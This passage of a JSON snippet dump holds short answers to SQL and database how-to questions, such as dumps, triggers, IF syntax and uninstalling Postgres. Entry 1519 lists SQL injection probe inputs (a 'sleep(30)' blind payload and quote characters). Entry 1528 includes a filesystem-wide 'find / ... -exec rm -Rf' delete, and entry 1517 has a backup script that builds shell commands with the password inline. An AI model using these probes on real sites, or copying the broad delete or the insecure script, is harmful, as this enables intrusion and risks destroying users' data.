    "description": ";extension=pdo_pgsql;extension=pgsql\nDB_CONNECTION=pgsqlDB_HOST=127.0.0.1DB_PORT=5432DB_DATABASE=database_nameDB_USERNAME=postgresDB_PASSWORD=your_choosen_password\nextension=pdo_pgsqlextension=pgsql\n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1512,
    "keyword": null,
    "link": null,
    "title": " how to stop all connections to a psql 12 database?",
    "description": "# Works for psql 12 select pg_terminate_backend(pid) from pg_stat_activity where datname='<db_name>';\n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1513,
    "keyword": null,
    "link": null,
    "title": " how to store select query result in variable in oracle",
    "description": "SELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1514,
    "keyword": null,
    "link": null,
    "title": " how to store the query result in a variable sql",
    "description": "SET @anyVariableName = ( yourQuery);\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1515,
    "keyword": null,
    "link": null,
    "title": " how to subtract from the value of a table in sql",
    "description": " UPDATE Inventory    SET Quantity = Quantity - 1  WHERE InventoryID = 2 \n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1516,
    "keyword": null,
    "link": null,
    "title": " how to switch user in mysql",
    "description": "Mysql user switch\n[madegow@fedora20 ~]$ mysql -u root -p Enter password:  ... MariaDB [(none)]> select user() -> ; +----------------+ | user()         | +----------------+ | root@localhost | +----------------+ 1 row in set (0.00 sec)  MariaDB [(none)]> system mysql -u madegow -p Enter password:  ... MariaDB [(none)]> select user(); +-------------------+ | user()            | +-------------------+ | madegow@localhost| \n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1517,
    "keyword": null,
    "link": null,
    "title": " how to take backup of mysql database using python",
    "description": "#!/usr/bin/python   ########################################################### # # This python script is used for mysql database backup # using mysqldump and tar utility. # # Written by : Rahul Kumar # Website: http://tecadmin.net # Created date: Dec 03, 2013 # Last modified: Aug 17, 2018  # Tested with : Python 2.7.15 & Python 3.5 # Script Revision: 1.4 # ##########################################################   # Import required python libraries   import os import time import datetime import pipes   # MySQL database details to which backup to be done. Make sure below user having enough privileges to take databases backup. # To take multiple databases backup, create any file like /backup/dbnames.txt and put databases names one on each line and assigned to DB_NAME variable.   DB_HOST = 'localhost'  DB_USER = 'root' DB_USER_PASSWORD = '_mysql_user_password_' #DB_NAME = '/backup/dbnameslist.txt' DB_NAME = 'db_name_to_backup' BACKUP_PATH = '/backup/dbbackup'   # Getting current DateTime to create the separate backup folder like \"20180817-123433\". DATETIME = time.strftime('%Y%m%d-%H%M%S') TODAYBACKUPPATH = BACKUP_PATH + '/' + DATETIME   # Checking if backup folder already exists or not. If not exists will create it. try:     os.stat(TODAYBACKUPPATH) except:     os.mkdir(TODAYBACKUPPATH)   # Code for checking if you want to take single database backup or assinged multiple backups in DB_NAME. print (\"checking for databases names file.\") if os.path.exists(DB_NAME):     file1 = open(DB_NAME)     multi = 1     print (\"Databases file found...\")     print (\"Starting backup of all dbs listed in file \" + DB_NAME) else:     print (\"Databases file not found...\")     print (\"Starting backup of database \" + DB_NAME)     multi = 0   # Starting actual database backup process. if multi:    in_file = open(DB_NAME,\"r\")    flength = len(in_file.readlines())    in_file.close()    p = 1    dbfile = open(DB_NAME,\"r\")      while p <= flength:        db = dbfile.readline()   # reading database name from file        db = db[:-1]         # deletes extra line        dumpcmd = \"mysqldump -h \" + DB_HOST + \" -u \" + DB_USER + \" -p\" + DB_USER_PASSWORD + \" \" + db + \" > \" + pipes.quote(TODAYBACKUPPATH) + \"/\" + db + \".sql\"        os.system(dumpcmd)        gzipcmd = \"gzip \" + pipes.quote(TODAYBACKUPPATH) + \"/\" + db + \".sql\"        os.system(gzipcmd)        p = p + 1    dbfile.close() else:    db = DB_NAME    dumpcmd = \"mysqldump -h \" + DB_HOST + \" -u \" + DB_USER + \" -p\" + DB_USER_PASSWORD + \" \" + db + \" > \" + pipes.quote(TODAYBACKUPPATH) + \"/\" + db + \".sql\"    os.system(dumpcmd)    gzipcmd = \"gzip \" + pipes.quote(TODAYBACKUPPATH) + \"/\" + db + \".sql\"    os.system(gzipcmd)   print (\"\") print (\"Backup script completed\") print (\"Your backups have been created in '\" + TODAYBACKUPPATH + \"' directory\") \n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1518,
    "keyword": null,
    "link": null,
    "title": " how to take database dump in postgresql",
    "description": "pg_dump -U username dbname > dbexport.pgsql \npg_dump dbname > outfile\n#To dump a database called mydb into a SQL-script file: pg_dump mydb > db.sql  #To reload such a script into a (freshly created) database named newdb: psql -d newdb -f db.sql\npsql databasename < data_base_dump\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1519,
    "keyword": null,
    "link": null,
    "title": " how to test for sql injection",
    "description": "Blind Injection:  MySQL example: http://localhost/test.php?id=sleep(30) If this SQL statement is interpreted by the database then it will take 30 seconds for the page to load.  Error Messages: http://localhost/test.php?id='\"\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1520,
    "keyword": null,
    "link": null,
    "title": " how to to get current date and time in sql",
    "description": "GETDATE() \nSELECT CURRENT_DATE from dual;\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1521,
    "keyword": null,
    "link": null,
    "title": " how to to get current date in sql",
    "description": "GETDATE() \nSELECT CURRENT_DATE from dual;\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1522,
    "keyword": null,
    "link": null,
    "title": " how to to get time in sql",
    "description": "SELECT CURRENT_DATE from dual;\n",
    "reg_date": "2021-10-12T09:56:10.000Z"
  },
  {
    "id": 1523,
    "keyword": null,
    "link": null,
    "title": " how to transfer pandas datafra,e to sqlite",
    "description": "import sqlite3 as db # Create your connection. conn = db.connect('connection_name') df.to_sql(name='table_name', con=conn) \n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1524,
    "keyword": null,
    "link": null,
    "title": " how to truncate all table in mysql workbench",
    "description": "SELECT     Concat('TRUNCATE TABLE ', TABLE_NAME) FROM     INFORMATION_SCHEMA.TABLES WHERE     table_schema = 'db_name'; \nSELECT Concat('TRUNCATE TABLE ',table_schema,'.',TABLE_NAME, ';')  FROM INFORMATION_SCHEMA.TABLES where  table_schema in ('db1_name','db2_name');\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1525,
    "keyword": null,
    "link": null,
    "title": " how to truncate foreign key constraint table",
    "description": "SET FOREIGN_KEY_CHECKS = 0; TRUNCATE table1;\n DELETE FROM [TableName] DBCC CHECKIDENT ([TableName], RESEED, 0) \n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1526,
    "keyword": null,
    "link": null,
    "title": " how to truncate table with foreign key constraint",
    "description": "SET FOREIGN_KEY_CHECKS = 0; TRUNCATE table1;\n DELETE FROM [TableName] DBCC CHECKIDENT ([TableName], RESEED, 0) \n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1527,
    "keyword": null,
    "link": null,
    "title": " how to uninstall microsoft sql server",
    "description": "First , use the normal process of uninstalling apps then, navigate through this path C:\\Users\\<Your UserName>\\AppData\\Roaming For those who don't see that, firstcheck the box written show hidden apps\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1528,
    "keyword": null,
    "link": null,
    "title": " how to uninstall postgresql in ubuntu",
    "description": "sudo apt-get --purge remove postgresql sudo apt-get purge postgresql* sudo apt-get --purge remove postgresql postgresql-doc postgresql-common\nsudo apt-get --purge remove postgresql postgresql-doc postgresql-common \nsudo aptitude purge postgresql postgresql-common sudo dpkg -P postgresql-8.4  sudo find / -name postgresql -exec rm -Rf {} \\; sudo find / -name pgsql -exec rm -Rf {} \\; sudo find / -name psql -exec rm -Rf {} \\;  sudo userdel postgres \n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1529,
    "keyword": null,
    "link": null,
    "title": " how to unlock table in mysql",
    "description": "UNLOCK TABLES;\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1530,
    "keyword": null,
    "link": null,
    "title": " how to update an attribute in MySQL",
    "description": "UPDATE table_name SET variable = 'changed field', variable = 'another changed field' WHERE firstline_name = 1;\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1531,
    "keyword": null,
    "link": null,
    "title": " how to update column name in psql",
    "description": "ALTER TABLE table_name   RENAME COLUMN old_name TO new_name;\nALTER TABLE order_details   RENAME TO order_information;\nALTER TABLE order_details   DROP COLUMN notes;\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1532,
    "keyword": null,
    "link": null,
    "title": " how to update date value in sql",
    "description": "UPDATE TABLE    SET EndDate = CAST('2009-05-25' AS DATETIME)  WHERE Id = 1\n",
    "reg_date": "2021-10-12T09:56:11.000Z"
  },
  {
    "id": 1533,
    "keyword": null,
    "link": null,
    "title": " how to update random rows in sql",
    "description": "UPDATE daTable    SET current = current + 1 ORDER     BY RAND() LIMIT 1 \n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1534,
    "keyword": null,
    "link": null,
    "title": " how to update rows from a table when certain conditions are met in mysql",
    "description": "UPDATE table_name SET column1 = value1, column2 = value2 WHERE condition <= condition AND condition != condition;\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1535,
    "keyword": null,
    "link": null,
    "title": " how to update values in sql",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE TABLE    SET EndDate = CAST('2009-05-25' AS DATETIME)  WHERE Id = 1\nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\n//to update value  UPDATE students SET course_id = 102 WHERE last_name = 'Jones'; ->                   if there is no condition it will update all!\nUpdates existing data in a table. Example: Updates the mileage and serviceDue values for a vehicle with an id of 45 in the cars table. UPDATE cars SET mileage = 23500, serviceDue = 0 WHERE id = 45;\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1536,
    "keyword": null,
    "link": null,
    "title": " how to upper case in sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\nLOWER/UPPER LOWER wandelt eine String in eine in Kleinbuchstaben um.  UPPER ist das Gegenst&uuml;ck zu LOWER, und wandelt den String  in Grossbuchstaben um.  SELECT LOWER (expression)  SELECT UPPER (expression) \n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1537,
    "keyword": null,
    "link": null,
    "title": " how to use a database to see tables mysql",
    "description": "show tables; \nSHOW TABLES;\nuse database_name; show tables; describe table_name;\nPress CTRL+C to copy SHOW [EXTENDED] [FULL] TABLES     [{FROM | IN} db_name]     [LIKE 'pattern' | WHERE expr]\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1538,
    "keyword": null,
    "link": null,
    "title": " how to use a trigger to validate input data",
    "description": "DELIMITER $$  CREATE TRIGGER example_before_insert_allow_only_one_active      BEFORE INSERT ON example_tbl FOR EACH ROW      BEGIN           IF NEW.active = 1 AND (SELECT COUNT(id) FROM example_tbl                 WHERE active=1 AND foreign_key_id=NEW.foreign_key_id) > 0           THEN                SIGNAL SQLSTATE '45000'                     SET MESSAGE_TEXT = 'Cannot add or update row: only one active row allowed per type';           END IF;      END; $$  CREATE TRIGGER example_before_update_allow_only_one_active      BEFORE UPDATE ON example_tbl  FOR EACH ROW      BEGIN           IF NEW.active = 1 AND (SELECT COUNT(id) FROM example_tbl                WHERE id<>NEW.id AND active=1 AND foreign_key_id=NEW.foreign_key_id) > 0           THEN                SIGNAL SQLSTATE '45000'                     SET MESSAGE_TEXT = 'Cannot add or update row: only one active row allowed per type';           END IF;      END; $$ \n-- validate email CREATE TRIGGER `person_validate_insert` \tBEFORE INSERT \tON `person` \tFOR EACH ROW BEGIN \tIF NEW.`email` NOT LIKE '%_@%_.__%' THEN \t\tSIGNAL SQLSTATE VALUE '45000' \t\t\tSET MESSAGE_TEXT = '[table:person] - `email` column is not valid'; \tEND IF; END;\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1539,
    "keyword": null,
    "link": null,
    "title": " how to use db.execute",
    "description": "#You can use this to get data from a SQL database #It works with python #Just insert the query that you want to run  db.execute(\"SELECT * FROM database1\").fetchall()  #Which fetches all my information from my database\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1540,
    "keyword": null,
    "link": null,
    "title": " how to use group concat in sql server",
    "description": "SELECT STRING_AGG(column_name, ',') AS Result FROM table_name\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1541,
    "keyword": null,
    "link": null,
    "title": " how to use lower case in mysql",
    "description": "+--------------------+ | LOWER('ATTENTION') | +--------------------+ | attention          | +--------------------+\nUPDATE my_table SET my_column = LOWER(my_column)\n",
    "reg_date": "2021-10-12T09:56:12.000Z"
  },
  {
    "id": 1542,
    "keyword": null,
    "link": null,
    "title": " how to use mysql shell in windows",
    "description": "mysqlsh\n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1543,
    "keyword": null,
    "link": null,
    "title": " how to use rank function in sql",
    "description": "BY LOVE SINGH, Here, name and id is the column name of the table tbltest.  SELECT \tname, \tRANK () OVER (  \t\tORDER BY id DESC \t) price_rank  FROM \ttbltest;\n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1544,
    "keyword": null,
    "link": null,
    "title": " how to use row number function in sql server",
    "description": "-- Uses AdventureWorks      SELECT ROW_NUMBER() OVER(ORDER BY SUM(SalesAmountQuota) DESC)      AS RowNumber,       FirstName, LastName,        CONVERT(varchar(13), SUM(SalesAmountQuota),1) AS SalesQuota    FROM dbo.DimEmployee AS e   INNER JOIN dbo.FactSalesQuota AS sq       ON e.EmployeeKey = sq.EmployeeKey   WHERE e.SalesPersonFlag = 1   GROUP BY LastName, FirstName;   \nUSE AdventureWorks2012;   GO   WITH OrderedOrders AS   (       SELECT SalesOrderID, OrderDate,       ROW_NUMBER() OVER (ORDER BY OrderDate) AS RowNumber       FROM Sales.SalesOrderHeader    )    SELECT SalesOrderID, OrderDate, RowNumber     FROM OrderedOrders    WHERE RowNumber BETWEEN 50 AND 60;   \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1545,
    "keyword": null,
    "link": null,
    "title": " how to view created temporary tables in mysql",
    "description": "CREATE TEMPORARY TABLE new_tbl SELECT * FROM orig_tbl LIMIT 0;\n SHOW TABLES FROM INFORMATION_SCHEMA LIKE 'INNODB_TEMP%'; \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1546,
    "keyword": null,
    "link": null,
    "title": " how to write if case in select query in select statement",
    "description": "SELECT player_name,        CASE WHEN year = 'FR' AND position = 'WR' THEN 'frosh_wr'             ELSE NULL END AS sample_case_statement   FROM benn.college_football_players \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1547,
    "keyword": null,
    "link": null,
    "title": " how to write lowercase in sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\nLOWER(string);\n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1548,
    "keyword": null,
    "link": null,
    "title": " how to write uppercase in sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1549,
    "keyword": null,
    "link": null,
    "title": " how use trigger in sql",
    "description": "CREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n-- Oracle DB Syntax CREATE OR REPLACE TRIGGER {trigger_name}  BEFORE | AFTER  INSERT | UPDATE | DELETE  ON {table_name} (FOR EACH ROW)  {operation to be executed}  -- for example CREATE TRIGGER log_updates  AFTER INSERT OR UPDATE ON Person FOR EACH ROW  INSERT INTO LogPerson(ts, IdPerson, surname) VALUES(CURRENT_TIMESTAMP, NEW.id, NEW.surname);\n-- SQL Server Syntax   -- Trigger on an INSERT, UPDATE, or DELETE statement to a table or view (DML Trigger)      CREATE [ OR ALTER ] TRIGGER [ schema_name . ]trigger_name    ON { table | view }    [ WITH <dml_trigger_option> [ ,...n ] ]   { FOR | AFTER | INSTEAD OF }    { [ INSERT ] [ , ] [ UPDATE ] [ , ] [ DELETE ] }    [ WITH APPEND ]   [ NOT FOR REPLICATION ]    AS { sql_statement  [ ; ] [ ,...n ] | EXTERNAL NAME <method specifier [ ; ] > }      <dml_trigger_option> ::=       [ ENCRYPTION ]       [ EXECUTE AS Clause ]      <method_specifier> ::=       assembly_name.class_name.method_name      \n-- Azure SQL Database Syntax    -- Trigger on an INSERT, UPDATE, or DELETE statement to a table or view (DML Trigger)      CREATE [ OR ALTER ] TRIGGER [ schema_name . ]trigger_name    ON { table | view }     [ WITH <dml_trigger_option> [ ,...n ] ]    { FOR | AFTER | INSTEAD OF }    { [ INSERT ] [ , ] [ UPDATE ] [ , ] [ DELETE ] }      AS { sql_statement  [ ; ] [ ,...n ] [ ; ] > }      <dml_trigger_option> ::=            [ EXECUTE AS Clause ]      \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1550,
    "keyword": null,
    "link": null,
    "title": " html search input",
    "description": "CREATE DATABASE databasename;\n  <form>   <label for=\"gsearch\">Search Google:</label>      <input type=\"search\" id=\"gsearch\" name=\"gsearch\">   </form> \n  document.getElementById(\"mySearch\").value = \"Favorite Cars\"; \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1551,
    "keyword": null,
    "link": null,
    "title": " iF statement ssrs report",
    "description": "=IIF(Fields!LineTotal.Value > 100, True, False)   \n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1552,
    "keyword": null,
    "link": null,
    "title": " id increment ms sql server",
    "description": "CREATE TABLE Persons (     Personid int IDENTITY(1,1) PRIMARY KEY,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int );\n",
    "reg_date": "2021-10-12T09:56:13.000Z"
  },
  {
    "id": 1553,
    "keyword": null,
    "link": null,
    "title": " identify number of rows in sql",
    "description": "#The COUNT() function returns the number of rows that match specific characteristics. SELECT \tCOUNT(*) FROM \tdatabase_name.table_name\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1554,
    "keyword": null,
    "link": null,
    "title": " identify primary key in oracle table",
    "description": "-- Primary key in a table SELECT * FROM ALL_CONSTRAINTS \t\t-- or DBA_CONSTRAINTS or UESR_CONSTRAINTS WHERE TABLE_NAME= 'table_name' AND CONSTRAINT_TYPE = 'P'; -- With columns names: SELECT c.OWNER, c.TABLE_NAME, c.CONSTRAINT_NAME, c.CONSTRAINT_TYPE,  \tcol.COLUMN_NAME FROM ALL_CONSTRAINTS c JOIN ALL_CONS_COLUMNS col ON c.TABLE_NAME = col.TABLE_NAME      AND c.CONSTRAINT_NAME = col.CONSTRAINT_NAME WHERE c.TABLE_NAME= 'table_name' AND c.CONSTRAINT_TYPE = 'P' ORDER BY c.TABLE_NAME, c.CONSTRAINT_NAME, col.COLUMN_NAME;\n-- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner   -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner \nCREATE TABLE table_name (   column1 datatype null/not null,   column2 datatype null/not null,   ...   CONSTRAINT constraint_name PRIMARY KEY (column1, column2, ... column_n) );\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1555,
    "keyword": null,
    "link": null,
    "title": " identify primary key in sql table",
    "description": "-- NOTE: this is for SQL-Oracle specifically  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner   -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner\nA primary key is a field in a table which uniquely identifies each row/record in a database table. Primary keys must contain unique values. A primary key column cannot have NULL values.  A table can have only one primary key, which may consist of single or multiple fields. When multiple fields are used as a primary key, they are called a composite key.  If a table has a primary key defined on any field(s), then you cannot have two records having the same value of that field(s).\nThe PRIMARY KEY constraint uniquely identifies each record in a table. Primary keys must contain UNIQUE values, and cannot contain NULL values.  A table can have only ONE primary key; and in the table, this primary key can consist of single or multiple columns (fields). \n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1556,
    "keyword": null,
    "link": null,
    "title": " identity column in sql server",
    "description": "SELECT IDENT_CURRENT('Pets') AS Result; \n/* To explicitly supply a value for identity column*/ /*first turn on identity_insert  set  identity_insert (Table_Name) on*/ SET IDENTITY_INSERT (Table_Name) ON  /*In the insert query specify the column's list insert into table*/ INSERT INTO (Table_Name) (Identity_Column,col2,col3,...) VALUES (Identity_Value,val2,val3,...)  /* Now set the identity_insert set off*/ SET IDENTITY_INSERT (Table_Name) OFF\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1557,
    "keyword": null,
    "link": null,
    "title": " identity insert is set to off",
    "description": "SET IDENTITY_INSERT sometableWithIdentity ON  INSERT sometableWithIdentity (IdentityColumn, col2, col3, ...) VALUES (AnIdentityValue, col2value, col3value, ...)  SET IDENTITY_INSERT sometableWithIdentity OFF\nSET IDENTITY_INSERT tbl_content ON \n   SET IDENTITY_INSERT [ [ database_name . ] schema_name . ] table_name { ON | OFF }   \n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1558,
    "keyword": null,
    "link": null,
    "title": " identity insert on sql server",
    "description": "SET IDENTITY_INSERT sometableWithIdentity ON  INSERT sometableWithIdentity (IdentityColumn, col2, col3, ...) VALUES (AnIdentityValue, col2value, col3value, ...)  SET IDENTITY_INSERT sometableWithIdentity OFF\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1559,
    "keyword": null,
    "link": null,
    "title": " if column value is null then in mysql",
    "description": " SELECT      contactname, IFNULL(bizphone, homephone) phone FROM     contacts;\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1560,
    "keyword": null,
    "link": null,
    "title": " if else in mysql stored procedure",
    "description": "-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\nIF condition THEN    statements; ELSE    else-statements; END IF;\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1561,
    "keyword": null,
    "link": null,
    "title": " if else in oracle sql query example",
    "description": "DECLARE     a number(3) := 100;  BEGIN     IF ( a = 10 ) THEN        dbms_output.put_line('Value of a is 10' );     ELSIF ( a = 20 ) THEN        dbms_output.put_line('Value of a is 20' );     ELSIF ( a = 30 ) THEN        dbms_output.put_line('Value of a is 30' );     ELSE         dbms_output.put_line('None of the values is matching');     END IF;     dbms_output.put_line('Exact value of a is: '|| a );   END;  / \nIF condition1 THEN    {...statements to execute when condition1 is TRUE...}  ELSIF condition2 THEN    {...statements to execute when condition1 is FALSE and condition2 is TRUE...}  ELSE    {...statements to execute when both condition1 and condition2 are FALSE...}  END IF;\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1562,
    "keyword": null,
    "link": null,
    "title": " if else sql",
    "description": "IF (Expression 1) BEGIN    Statement 1; END  ELSE IF (Expression 2) BEGIN    Statement 2; END .......... ELSE  BEGIN    Default Statement; END\n-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query (DUAL is for Oracle) SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result FROM DUAL;\nIF Boolean_expression BEGIN     -- Statement block executes when the Boolean expression is TRUE END ELSE BEGIN     -- Statement block executes when the Boolean expression is FALSE END\nSELECT CASE                          WHEN A + B > C AND B + C > A AND A + C > B THEN                 CASE                      WHEN A = B AND B = C THEN 'Equilateral'                     WHEN A = B OR B = C OR A = C THEN 'Isosceles'                     ELSE 'Scalene'                 END             ELSE 'Not A Triangle'         END FROM TRIANGLES; \nIF 1=1 \tSELECT 1 ELSE \tSELECT 0 -- returns 1  -- Definition IF Boolean_expression         { sql_statement | statement_block }    [ ELSE         { sql_statement | statement_block } ]\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1563,
    "keyword": null,
    "link": null,
    "title": " if in MySQL",
    "description": "IF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\n-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\nSELECT IF(1>3,'true','false');\nIF condition THEN    statements; ELSE    else-statements; END IF;\nSELECT IF(500<1000, \"YES\", \"NO\");\n   IF(condition, value_if_true, value_if_false)\n",
    "reg_date": "2021-10-12T09:56:14.000Z"
  },
  {
    "id": 1564,
    "keyword": null,
    "link": null,
    "title": " if in sql",
    "description": "-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query (DUAL is for Oracle) SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result FROM DUAL;\nIF Boolean_expression BEGIN     -- Statement block executes when the Boolean expression is TRUE END ELSE BEGIN     -- Statement block executes when the Boolean expression is FALSE END\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1565,
    "keyword": null,
    "link": null,
    "title": " if inside select mysql",
    "description": "SELECT IF(1>3,'true','false');\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1566,
    "keyword": null,
    "link": null,
    "title": " if mysql",
    "description": "IF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\n-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\nIF condition THEN    statements; ELSE    else-statements; END IF;\nSELECT IF(500<1000, \"YES\", \"NO\");\n   IF(condition, value_if_true, value_if_false)\n//Syntax SELECT * FROM `tableName` WHERE `ColumnName` IN (Value1,Value1,Value1);  //Example: SELECT * FROM `members` WHERE `membership_number` IN (1,2,3); \n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1567,
    "keyword": null,
    "link": null,
    "title": " if not exists insert sql",
    "description": "IF NOT EXISTS (SELECT * FROM EmailsRecebidos                     WHERE De = @_DE                    AND Assunto = @_ASSUNTO                    AND Data = @_DATA)    BEGIN        INSERT INTO EmailsRecebidos (De, Assunto, Data)        VALUES (@_DE, @_ASSUNTO, @_DATA)    END\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1568,
    "keyword": null,
    "link": null,
    "title": " if not null pl sql oracle",
    "description": "IF variable IS NOT NULL then   ...do_something... END IF;\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1569,
    "keyword": null,
    "link": null,
    "title": " if null mysql",
    "description": "SELECT *  FROM table  WHERE YourColumn IS NOT NULL;\nSELECT * FROM contacts WHERE last_name IS NULL;\nIFNULL(MAX(EMAIL), \"example@google.com\") as email\nSELECT * from TABLE where CODE IS NULL OR CODE!='C'\n SELECT      contactname, IFNULL(bizphone, homephone) phone FROM     contacts;\nSELECT IFNULL(NULL, \"W3Schools.com\");\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1570,
    "keyword": null,
    "link": null,
    "title": " ifnull postgres",
    "description": "SELECT coalesce(column, 1) \n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1571,
    "keyword": null,
    "link": null,
    "title": " ignore duplicate rows in sqlite",
    "description": "SELECT DISTINCT id FROM Table -- use \"DISTINCT\" to ignore same values\nINSERT OR REPLACE INTO MAIN (...) VALUES (...) \n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1572,
    "keyword": null,
    "link": null,
    "title": " ilike for date postgres",
